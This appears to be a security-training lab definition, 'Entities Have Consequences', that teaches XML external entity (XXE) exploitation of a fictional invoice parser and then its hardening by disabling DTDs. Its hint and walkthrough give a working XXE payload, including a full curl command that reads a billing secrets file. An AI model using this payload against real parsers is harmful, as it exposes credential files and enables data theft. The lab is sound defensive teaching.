title: Entities Have Consequences
subtitle: XXE against Arclight's invoice parser
summary: Arclight normalises XML invoices and resolves external entities. Read the billing service's secret file, then disable DTD processing while keeping ordinary invoices working.
scenario: A supplier integration posts XML invoices to Arclight. The parser still expands external entities, and the service's document store contains a billing token. Exploit the parser, then harden it.
learningObjectives: Explain how external entity expansion reads local files
authorizedScope: Only the Arclight training parser. Tokens are synthetic.
riskSummary: XXE reads local files, reaches internal services and can exhaust memory. Historically it has leaked cloud credentials from production parsers.
remediation: Disable DTDs and external entities, prefer a parser profile without entity expansion, and keep XML libraries patched.
conclusion: You read a protected document through entity expansion and then blocked DTDs without breaking normal invoices.

objectives.title: Read the billing secret
objectives.description: Submit a document that declares an external entity pointing at /srv/arclight/secrets/billing.env and submit the token it resolves.

hints.text: A DOCTYPE may declare `<!ENTITY secret SYSTEM "file:///srv/arclight/secrets/billing.env">` and reference `&secret;` inside the body.

objectives.title: Disable DTDs
objectives.description: Apply the hardening policy. The live check posts the XXE document (must be rejected) and a normal invoice (must still parse).

walkthrough.title: Normal invoice
walkthrough.body: Confirm the parser accepts a plain document.

walkthrough.title: Declare the entity
walkthrough.body: Point an external entity at the secrets file and reference it.
walkthrough.snippet: curl -s -X POST -H 'content-type: application/xml' --data '<?xml version="1.0"?><!DOCTYPE invoice [<!ENTITY s SYSTEM "file:///srv/arclight/secrets/billing.env">]><invoice><line>&s;</line></invoice>' $CF_TARGET_URL/api/documents/parse | jq
